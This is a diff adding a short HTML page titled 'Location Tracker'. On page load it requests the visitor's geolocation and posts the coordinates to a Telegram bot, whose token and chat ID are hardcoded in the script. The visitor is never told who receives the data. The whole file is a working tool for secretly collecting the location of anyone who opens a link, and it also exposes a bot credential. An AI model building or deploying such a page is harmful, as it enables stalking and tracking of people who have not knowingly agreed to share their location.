@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Tracker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f2f2f2;
+    }
+    h1 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h1>Requesting Your Location...</h1>
+
+  <script>
+    const botToken = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
+    const chatId = '7570861617';
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const message = `📍 New Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.body.innerHTML = "<h2>✅ Location sent successfully.</h2>";
+      })
+      .catch(error => {
+        document.body.innerHTML = "<h2>❌ Failed to send location.</h2>";
+        console.error(error);
+      });
+    }
+
+    function errorHandler(error) {
+      document.body.innerHTML = "<h2>❌ Location access denied or unavailable.</h2>";
+      console.error(error);
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocation, errorHandler);
+    } else {
+      document.body.innerHTML = "<h2>❌ Geolocation is not supported by this browser.</h2>";
+    }
+  </script>
+</body>
+</html>
